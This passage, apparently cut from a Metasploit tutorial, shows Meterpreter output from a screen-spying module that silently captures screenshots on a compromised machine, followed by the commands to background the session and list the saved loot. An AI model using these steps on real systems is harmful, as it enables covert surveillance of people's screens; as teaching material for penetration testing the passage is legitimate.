    [*] Capturing 6 screenshots with a delay of 5 seconds

    [*] Screen Spying Complete

    [*] run loot -t screenspy.screenshot to see file locations

    meterpreter >

    ```


    The screenshots are automatically taken at the defined interval and saved. To
    view the saved screenshots:


    Type, *"background"*

    Then enter, *"loot -t screenspy.screenshot"* to view the location of the saved
    files.'
